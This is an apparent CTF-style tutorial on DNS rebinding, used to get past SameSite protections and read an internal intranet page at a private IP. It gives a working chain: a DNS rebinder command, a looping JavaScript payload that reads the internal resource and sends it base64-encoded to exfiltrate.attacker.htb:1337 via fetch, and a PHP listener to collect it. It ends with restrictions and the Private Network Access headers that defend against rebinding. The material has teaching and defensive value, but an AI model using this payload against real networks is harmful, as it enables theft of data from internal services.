Here we will treat how we can use DNSRebind technique to bypass **SameSite** and ex-filtrate data that otherwise would be accessible only internally and protected by SameSite.
As we know from CSRF protections same site checks that schema+URL+port matches otherwise it will be blocked if any of those are not same... EX: `http://cacca.com & https://cacca.com` are not same as schema is different.

### Scenario:
We have the victim running the intranet on the internal(private) IP  `http://192.168.178.1:8080/flag` and running Same-site cookies, which means we can't access it if our Refer is not matching the same policy

### How to exploit
1)Setup a fake DNSRebind that resolves **attacker.htb=ATTACKERIP** and then with low TTL rebinds to the internal Private IP **attacker.htb=192.168.178.1**
```
sudo python3 dnsrebinder.py --domain www.attacker.htb. --rebind 192.168.178.1 --ip $PUBLIC_WEBSERVER_IP --counter 1 --tcp --udp
```
2)Host a **exfiltrate.js** file that will perform read+ex-filtrate to **exfiltrate.htb** (will run every 2 sec to bypass browsers DNS caching feature)
```
<script>
    startAttack();

    function startAttack(){
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://www.attacker.htb/secret', true);
        xhr.onload = () => {
          fetch('http://exfiltrate.attacker.htb:1337/log?data=' + btoa(xhr.response));
        };
        xhr.send();

    setTimeout(startAttack, 2000);
    }
</script>
```
3)Host the **exfiltrate.js** in our HTTP server ready to be shipped
4)Setup the ex-filtrating server 
```
php -S 0.0.0.0:1337 
```
5)When shipping the URL to http://attacker.htb/exfiltrate.js will resolve to our **ATTACKERIP** effectively bypassing the loop-back filters but then the DNSRebind server will resolve back to **192.168.178.1** and reading the internal resources.

## RESTRICTION: 
if the back-end is protected by authentication tokens then you are fucked as token will most likely not transit Cross Requests, which means you need a valid authenticated session to bypass it. The reason is on the first resolve 
the request is made to our IP and in the rebind the refer would be pointing to the internal intranet IP **192.168.x.x** and refer is different thus will session not work.
Modern browser have a feature called DNS Caching, to bypass it and make the DNS Rebind happen we need to loop the JS every 2 seconds.
Furthermore there are 2 new HTTP Response headers that will prevent DNS rebinds:
```
    Access-Control-Request-Local-Network: the request header set by the browser if the current origin's IP address makes a request to an origin with a less public IP Address
    Access-Control-Allow-Local-Network: the response header set by a web application if the response can be shared with external networks
```
In this case, less public is defined as any IP address pointing to the local machine (e.g. 127.0.0.1) if the origin's IP address is not pointing to the local machine (e.g. 192.168.178.1). If the origin's IP address is public, then less public would refer to any any private IP address. 
This prevents DNS rebinding by considering the IP address an origin resolves to when making a request.